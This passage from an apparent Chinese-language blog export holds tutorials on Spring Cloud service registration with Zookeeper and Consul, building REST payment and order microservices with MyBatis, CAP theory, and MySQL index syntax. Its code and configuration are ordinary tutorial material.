&lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;/artifactId&gt; &lt;!-- 排除自带的zookeeper3.5.3--&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 添加zookeeper3.4.9--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.9&lt;/version&gt; &lt;/dependency&gt; 测试 访问 1localhost:8004&#x2F;payment&#x2F;zk 是临时节点，项目停止后，连接会持续一小段时间，然后丢失。重新连接后是另一个UUID的Zookepper。 订单服务注册zookeeper 新建cloud-consumerzk-order80 复制80的pom yml 1234567891011server: port: 80#服务别名spring: application: name: cloud-consumer-order cloud: zookeeper: # zookeeper的机器ip加端口号 connect-string: 192.168.111.144:2181 启动: 123456789package com.kayleh.springcloud;@SpringBootApplication@EnableDiscoveryClientpublic class OrderZkMain80 &#123; public static void main(String[] args) &#123; SpringApplication.run(OrderZkMain80.class, args); &#125;&#125; config: 12345678910package com.kayleh.springcloud.config;@Configurationpublic class ApplicationContextConfig &#123; @Bean @LoadBalanced public RestTemplate getRestTemplate() &#123; return new RestTemplate(); &#125;&#125; controller 12345678910111213141516171819package com.kayleh.springcloud.controller;@RestController@Slf4jpublic class OrderZkController &#123; public static final String INVOKE_URL = \"http://cloud-provider-payment\"; @Resource private RestTemplate restTemplate; @GetMapping(\"/consumer/payment/create\") public CommonResult&lt;Payment&gt; create(Payment payment) &#123; return restTemplate.postForObject(INVOKE_URL + \"/payment/create\", payment, CommonResult.class); &#125; @GetMapping(\"/consumer/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPayment(@PathVariable(\"id\") Long id) &#123; return restTemplate.getForObject(INVOKE_URL + \"/payment/get/\" + id, CommonResult.class); &#125;&#125; 服务访问地址INVOKE_URL填linux上的zookeeper名称 测试,启动 80zk 和 8004. 访问 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;zk Consul https://www.consul.io/downloads.html 启动 1consul agent -dev 访问 1http:&#x2F;&#x2F;localhost:8500&#x2F;ui&#x2F; 服务提供者注册进Consul新建模块cloud-providerConsul-payment8006 pom.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;dependencies&gt; &lt;!--consul--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 热部署--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yml 123456789101112131415server: port: 8006#服务别名spring: application: name: consul-provider-payment###consul注册中心地址 cloud: consul: host: localhost port: 8500 discovery: service-name: $&#123;spring.application.name&#125;# hostname: 127.0.0.1 主启动类 controller 1234567891011@RestController@Slf4jpublic class PaymentController &#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; @RequestMapping(value = \"/payment/consul\") public String paymentConsul() &#123; return \"Springcloud with consul:\" + serverPort + \"\\t\" + UUID.randomUUID().toString(); &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost:8006&#x2F;payment&#x2F;consul 服务消费者注册进Consul新建模块cloud-consumer-consul-order80 pom.xml 12345678910111213141516171819202122232425262728293031323334&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 主启动类 复制cloud-consumerzk-order80模块的ApplicationContextConfig controller 1234567891011121314@RestController@Slf4jpublic class OrderConsulController &#123; public static final String INVOKE_URL = \"http://consul-provider-payment\"; @Resource private RestTemplate restTemplate; @GetMapping(\"/consumer/payment/consul\") public String paymentInfo() &#123; String result = restTemplate.getForObject(INVOKE_URL + \"/payment/consul\", String.class); return result; &#125;&#125; 三个注册中心的异同 C : Consistency(强一致性) A : Availability(可用性) P : Partition tolerance(分区容错性) CAP理论关注粒度是数据，而不是整体系统设计的策略 AP架构当网络分区出现后，为了保证可用性，系统B可用返回旧值，保证系统的可用性 结论：违背了一致性C的要求，只满足可用性和分区容错，即AP CP架构当网络分区出现后，为了保证一致性，就必须拒接请求，否则无法保证一致性。 结论：违背了可用性A的要求，只满足一致性和分区容错，即CP","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud","slug":"分布式的微服务架构1","date":"2020-08-02T22:07:44.000Z","updated":"2021-04-11T17:11:28.644Z","comments":true,"path":"springcloud/","link":"","permalink":"https://kayleh.top/springcloud/","excerpt":"SpringCloud——基于分布式的微服务架构","text":"SpringCloud——基于分布式的微服务架构 服务构建 SpringCloud分布式微服务架构的一站式解决方案，是多种微服务架构落地技术的集合体，俗称微服务全家桶。 版本依赖 json转换：https://start.spring.io/actuator/info 工程构建：微服务cloud整体聚合父工程Project new 字符编码 注解生效激活 java编译8 美观，过滤文件*.idea;*.iml; pom 添加一行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;packaging&gt;pom&lt;/packaging&gt;&lt;!--统一管理jar包版本--&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;lombok.version&gt;1.16.18&lt;/lombok.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt; &lt;druid.version&gt;1.1.16&lt;/druid.version&gt; &lt;mybatis.spring.boot.version&gt;1.3.0&lt;/mybatis.spring.boot.version&gt;&lt;/properties&gt;&lt;!--子模块继承之后，提供作用：锁定版本+子module不用谢groupId和version--&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--spring boot 2.2.2--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud Hoxton.SR1--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud 阿里巴巴--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;2.1.0.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;$&#123;mysql.version&#125;&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;$&#123;druid.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;$&#123;mybatis.spring.boot.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!--junit--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;$&#123;junit.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!--log4j--&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;$&#123;log4j.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 子项目pom： 跳过test： Rest微服务工程构建新建模块cloud-provider-payment8001 pom.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 创建application.yml 12345678910111213141516server: port: 8001spring: application: name: cloud-payment-service datasource: type: com.alibaba.druid.pool.DruidDataSource #当前数据源操作类型 driver-class-name: org.gjt.mm.mysql.Driver #mysql驱动包 url: jdbc:mysql://localhost:3306/cloud?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false username: root password: adminmybatis: mapperLocations: classpath:mapper/*.xml type-aliases-package: com.kayleh.springcloud.entities #所有Entity别名类所在包 主启动类 123456789101112131415package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @Author: Wizard * @Date: 2020/8/3 18:10 */@SpringBootApplicationpublic class PaymentMain8001 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentMain8001.class, args); &#125;&#125; 业务类建表SQL 12345CREATE TABLE &#96;payment&#96;(&#96;id&#96; BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,&#96;serial&#96; VARCHAR(200) DEFAULT &#39;&#39;,PRIMARY KEY(&#96;id&#96;))ENGINE&#x3D;INNODB AUTO_INCREMENT&#x3D;1 DEFAULT CHARSET&#x3D;utf8; entities 主实体类 12345678910111213141516171819package com.kayleh.springcloud.entities;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;import java.io.Serializable;/** * @Author: Wizard * @Date: 2020/8/3 21:23 */@Data@AllArgsConstructor@NoArgsConstructorpublic class Payment implements Serializable &#123; private Long id; private String serial;&#125; Json封装体 1234567891011121314151617181920212223package com.kayleh.springcloud.entities;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;/** * @Author: Wizard * @Date: 2020/8/3 21:27 */@Data@AllArgsConstructor@NoArgsConstructorpublic class CommonResult&lt;T&gt; &#123; //404 not_found private Integer code; private String message; private T data; public CommonResult(Integer code, String message) &#123; this(code, message, null); &#125;&#125; DAO 12345678910111213141516package com.kayleh.springcloud.dao;import com.kayleh.springcloud.entities.Payment;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Param;/** * @Author: Wizard * @Date: 2020/8/3 23:23 */@Mapperpublic interface PaymentDao &#123; public int create(Payment payment); public Payment getPaymentById(@Param(\"id\") Long id);&#125; PaymentMapper.xml(resources目录下的mapper目录) 1234567891011121314151617181920212223&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTO Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt;&lt;mapper namespace=\"com.kayleh.springcloud.dao.PaymentDao\"&gt; &lt;!-- id对应接口的类名--&gt; &lt;!-- parameterType对应类的参数类型--&gt; &lt;!-- useGeneratedKeys使用生成的主键--&gt; &lt;!-- keyProperty主键是id--&gt; &lt;insert id=\"create\" parameterType=\"Payment\" useGeneratedKeys=\"true\" keyProperty=\"id\"&gt; insert into payment(serial) values (#&#123;serial&#125;); &lt;/insert&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.kayleh.springcloud.entities.Payment\"&gt; &lt;!--column 对应数据库的列名 property 对应java实体类的属性名 jdbcType 在数据库的类型--&gt; &lt;id column=\"id\" property=\"id\" jdbcType=\"BIGINT\"/&gt; &lt;id column=\"serial\" property=\"serial\" jdbcType=\"VARCHAR\"/&gt; &lt;/resultMap&gt; &lt;select id=\"getPaymentById\" parameterType=\"Long\" resultMap=\"BaseResultMap\"&gt; select * from payment where id = #&#123;id&#125;; &lt;/select&gt;&lt;/mapper&gt; PaymentService 1234567891011121314package com.kayleh.springcloud.service;import com.kayleh.springcloud.entities.Payment;import org.apache.ibatis.annotations.Param;/** * @Author: Wizard * @Date: 2020/8/3 23:58 */public interface PaymentService &#123; public int create(Payment payment); public Payment getPaymentById(@Param(\"id\") Long id);&#125; PaymentServiceImpl 12345678910111213141516171819202122232425262728293031package com.kayleh.springcloud.service.impl;import com.kayleh.springcloud.dao.PaymentDao;import com.kayleh.springcloud.entities.Payment;import com.kayleh.springcloud.service.PaymentService;import org.springframework.stereotype.Service;import javax.annotation.Resource;/** * @Author: Wizard * @Date: 2020/8/4 0:00 */@Servicepublic class PaymentServiceImpl implements PaymentService &#123; // @Resouce线程安全,是java自带的。 // @Autowired是Spring的 @Resource PaymentDao paymentDao; @Override public int create(Payment payment) &#123; return paymentDao.create(payment); &#125; @Override public Payment getPaymentById(Long id) &#123; return paymentDao.getPaymentById(id); &#125;&#125; PaymentController 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.kayleh.springcloud.controller;import com.kayleh.springcloud.entities.CommonResult;import com.kayleh.springcloud.entities.Payment;import com.kayleh.springcloud.service.PaymentService;import lombok.extern.slf4j.Slf4j;import org.apache.ibatis.annotations.Param;import org.springframework.web.bind.annotation.*;import javax.annotation.Resource;/** * @Author: Wizard * @Date: 2020/8/4 0:07 */@RestController@Slf4jpublic class PaymentController &#123; @Resource private PaymentService paymentService; @PostMapping(value = \"/payment/create\") public CommonResult create(@RequestBody Payment payment) &#123; int result = paymentService.create(payment); log.info(\"-------插入结果------\" + result); if (result &gt; 0) &#123; return new CommonResult(200, \"插入数据库成功\", result); &#125; else &#123; return new CommonResult(444, \"插入数据库失败\", null); &#125; &#125; @GetMapping(value = \"/payment/get/&#123;id&#125;\") public CommonResult getPaymentById(@PathVariable(\"id\") Long id) &#123; Payment payment = paymentService.getPaymentById(id); log.info(\"-------插入结果------\" + payment); if (payment != null) &#123; return new CommonResult(200, \"查询成功\", payment); &#125; else &#123; return new CommonResult(444, \"没有对应记录,查询id:\" + id, null); &#125; &#125;&#125; 消费者订单model新建工程cloud-consumer-order80 pom.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;parent&gt; &lt;artifactId&gt;cloud&lt;/artifactId&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;cloud-consumer-order80&lt;/artifactId&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 热部署--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; application.yml 12server: port: 80 拷贝payment模块的实体类entities 启动类 123456789101112131415package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @Author: Wizard * @Date: 2020/8/4 11:20 */@SpringBootApplicationpublic class OrderMain80 &#123; public static void main(String[] args) &#123; SpringApplication.run(OrderMain80.class, args); &#125;&#125; RestTemplateRestTemplate提供了多种便捷访问远程HTTP访问的方法,是一种简单便捷的访问restful服务模块类,是Spring提供的用于访问Rest服务的客户端模块工具集. (url,requestMap,ResponseBean.class)三个参数分别代表 REST请求地址、请求参数、HTTP响应转换被转换成的对象类型。 RestTemplate 123456789101112131415161718package com.kayleh.springcloud.config;import org.springframework.beans.factory.annotation.Configurable;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.client.RestTemplate;/** * @Author: Wizard * @Date: 2020/8/4 12:54 */@Configurationpublic class ApplicationContextConfig &#123; @Bean public RestTemplate getRestTemplate() &#123; return new RestTemplate(); &#125;&#125; OrderController 123456789101112131415161718192021222324252627282930313233343536package com.kayleh.springcloud.controller;import com.kayleh.springcloud.entities.CommonResult;import com.kayleh.springcloud.entities.Payment;import lombok.extern.slf4j.Slf4j;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestBody;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.client.RestTemplate;import javax.annotation.Resource;/** * @Author: Wizard * @Date: 2020/8/4 11:24 */@RestController@Slf4jpublic class OrderController &#123; public static final String PAYMENT_URL = \"http://localhost:8001\"; @Resource private RestTemplate restTemplate; @GetMapping(\"/consumer/payment/create\") public CommonResult&lt;Payment&gt; create(Payment payment) &#123; return restTemplate.postForObject(PAYMENT_URL + \"/payment/create\", payment, CommonResult.class); &#125; @GetMapping(\"/consumer/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPayment(@PathVariable(\"id\") Long id) &#123; return restTemplate.getForObject(PAYMENT_URL + \"/payment/get/\" + id, CommonResult.class); &#125;&#125; 即可调用另一个微服务模块 重构, 实体类entities共用 新建工程cloud-api-commons pom.xml 123456789101112131415161718&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 拷贝payment模块的实体类entities 选中这个模块,使用maven clean和install 然后在consumer模块引入pom坐标 12345&lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt;&lt;/dependency&gt; cloud-provider-payment8001模块也是这样做.","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"MYSQL","slug":"MYSQL","date":"2020-08-02T06:54:25.000Z","updated":"2021-04-11T17:11:28.319Z","comments":true,"path":"mysql/","link":"","permalink":"https://kayleh.top/mysql/","excerpt":"MYSQL索引","text":"MYSQL索引 MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。 打个比方，如果合理的设计且使用索引的MySQL是一辆兰博基尼的话，那么没有设计和使用索引的MySQL就是一个人力三轮车。 拿汉语字典的目录页（索引）打比方，我们可以按拼音、笔画、偏旁部首等排序的目录（索引）快速查找到需要的字。 索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。 创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)。 实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。 上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。 建立索引会占用磁盘空间的索引文件。 普通索引创建索引这是最基本的索引，它没有任何限制。它有以下几种创建方式： 1CREATE INDEX indexName ON mytable(username(length)); 如果是CHAR，VARCHAR类型，length可以小于字段实际长度；如果是BLOB和TEXT类型，必须指定 length。 修改表结构(添加索引)1ALTER table tableName ADD INDEX indexName(columnName) 创建表的时候直接指定123456789CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); 删除索引的语法1DROP INDEX [indexName] ON mytable; 唯一索引它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式： 创建索引1CREATE UNIQUE INDEX indexName ON mytable(username(length)) 修改表结构1ALTER table mytable ADD UNIQUE [indexName] (username(length)) 创建表的时候直接指定123456789CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, UNIQUE [indexName] (username(length)) ); 使用ALTER 命令添加和删除索引有四种方式来添加数据表的索引： ALTER TABLE tbl_name ADD PRIMARY KEY (column_list): 该语句添加一个主键，这意味着索引值必须是唯一的，且不能为NULL。 ALTER TABLE tbl_name ADD UNIQUE index_name (column_list): 这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）。 ALTER TABLE tbl_name ADD INDEX index_name (column_list): 添加普通索引，索引值可出现多次。 ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list): 该语句指定了索引为 FULLTEXT ，用于全文索引。 以下实例为在表中添加索引。 1mysql&gt; ALTER TABLE testalter_tbl ADD INDEX (c); 你还可以在 ALTER 命令中使用 DROP 子句来删除索引。尝试以下实例删除索引: 1mysql&gt; ALTER TABLE testalter_tbl DROP INDEX c; 使用 ALTER 命令添加和删除主键主键只能作用于一个列上，添加主键索引时，你需要确保该主键默认不为空（NOT NULL）。实例如下： 12mysql&gt; ALTER TABLE testalter_tbl MODIFY i INT NOT NULL;mysql&gt; ALTER TABLE testalter_tbl ADD PRIMARY KEY (i); 你也可以使用 ALTER 命令删除主键： 1mysql&gt; ALTER TABLE testalter_tbl DROP PRIMARY KEY; 删除主键时只需指定PRIMARY KEY，但在删除索引时，你必须知道索引名。 显示索引信息你可以使用 SHOW INDEX 命令来列出表中的相关的索引信息。可以通过添加 \\G 来格式化输出信息。 尝试以下实例: 12mysql&gt; SHOW INDEX FROM table_name; \\G........ MySQL 临时表 MySQL 临时表在我们需要保存一些临时数据时是非常有用的。临时表只在当前连接可见，当关闭连接时，Mysql会自动删除表并释放所有空间。临时表在MySQL 3.23版本中添加，如果你的MySQL版本低于 